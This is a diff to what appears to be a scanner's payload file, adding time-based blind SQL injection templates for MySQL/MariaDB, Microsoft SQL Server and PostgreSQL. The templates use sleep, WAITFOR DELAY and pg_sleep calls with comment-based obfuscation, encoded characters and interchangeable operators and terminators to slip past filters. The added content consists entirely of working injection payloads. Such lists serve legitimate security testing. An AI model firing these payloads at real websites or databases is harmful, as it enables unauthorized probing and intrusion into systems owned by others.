@@ -15,6 +15,93 @@
                 0.2
             ],
             "type": "time"
+        },
+        {
+            "payload": [
+
+                " QUOTE  'XOR(if(now()=sysdate(),sleep(7),0))XOR'  QUOTE",
+                "'%E2%84%A2' QUOTE '/*F*/' OP '/*f*/sleep(7)=' QUOTE ",
+                "'%E2%84%A2' QUOTE ')/*F*/' OP '/*f*/sleep(7)=' QUOTE",
+                "'%E2%84%A2 QUOTE )/*F*/' OP '/*f*/sleep(7)=' QUOTE",
+                " OP '(if(now()=sysdate(),sleep(7),0))' OP '%23'",
+                " QUOTE  OP  'sleep(7)--#'",
+                " QUOTE  OP  'sleep(7)#'",
+                " QUOTE  OP  'sleep(7)=' QUOTE '#'",
+                " QUOTE  OP  'sleep(7)=' QUOTE '--'",
+
+                " QUOTE  OP  'sleep(7)--%23'",
+                " QUOTE  OP  'sleep(7)%23'",
+                " QUOTE  OP  'sleep(7);%00'",
+                " OP  'sleep(7)--+-'",
+                " OP  'sleep(7)#'",
+                " QUOTE '/*f*/ OP /*f*/sleep/*f*/(7)--#'",
+                " QUOTE '/*f*/ OP /*f*/sleep/*f*/(7)#'",
+                " OP  'sleep(7)%23'",
+                " QUOTE '/*f*/ OP /*f*/sleep/*f*/(7)--%23'",
+                " QUOTE '/*f*/ OP /*f*/sleep/*f*/(7)%23'",
+                " QUOTE '/*f*/ OP /*f*/sleep/*f*/(7);%00'",
+                " OP '/*f*/sleep/*f*/(7)--+-'",
+                " OP '/*f*/sleep/*f*/(7)#'",
+
+                " QUOTE  OP '(if(now()=sysdate(),sleep(7),0))--#'",
+                " QUOTE  OP '(if(now()=sysdate(),sleep(7),0))#'",
+                " OP' /*f*/sleep/*f*/(7)%23'",
+                " QUOTE  OP '(if(now()=sysdate(),sleep(7),0))--%23'",
+                " QUOTE  OP '(if(now()=sysdate(),sleep(7),0))%23'",
+                " QUOTE  OP '(if(now()=sysdate(),sleep(7),0));%00'",
+                " OP '(if(now()=sysdate(),sleep(7),0))--+-'",
+                " OP '(if(now()=sysdate(),sleep(7),0))#'",
+                " OP '(if(now()=sysdate(),sleep(7),0))%23'",
+                "'\\/*F*/' OP '/*f*/sleep(7)%23'",
+                "'\\)/*F*/' OP '/*f*/sleep(7)%23'",
+                "'\\)/*F*/' OP '/*f*/sleep(7)%23'",
+                "'%E2%84%A2%27/*F*/' OP '/*f*/sleep(7)%23'",
+                "'%E2%84%A2%22/*F*/' OP '/*f*/sleep(7)%23'",
+                "'%E2%84%A2%22/*F*/' OP '/*f*/sleep(7)--+-'",
+                "'%E2%84%A2\\)/*F*/' OP '/*f*/sleep(7)--+-'",
+                "'%E2%84%A2%27)/*F*/' OP '/*f*/sleep(7)--+-'"
+
+            ],
+            "verify": [
+                7
+            ],
+            "type": "time",
+            "tags":["mariadb", "mysql", "payload_template"],
+            "vars":{
+                "QUOTE": ["'"],
+                "OP": ["and", "AND", "OR", "or"]
+            }
+        },
+        {
+            "payload": [
+                "start 'WAITFORDELAY' QUOTE '0:0:7' end"
+            ],
+            "verify": [
+                7
+            ],
+            "type": "time",
+            "tags": ["microsoftsql", "payload_template"],
+            "vars":{
+                "start": ["", "'"],
+                "QUOTE": ["'"],
+                "end": [";%00","#","%23",";%00","--+-","='","#","%23","--+-"],
+                "encoding": ["none", "quote"]
+            }
+        },
+        {
+            "payload": [
+                "{QUOTE, ''} '/*F*/' OP '/*F*/ pg_sleep(7)' end"
+            ],
+            "verify": [
+                7
+            ],
+            "type": "time",
+            "tags": ["postgresql", "payload_template"],
+            "vars":{
+                "OP": ["and","or", "OR", "AND"],
+                "end": ["%23", "#", "--+-", ";%00", "%00"],
+                "QUOTE": ["'"]
+            }
         }
     ]
 }
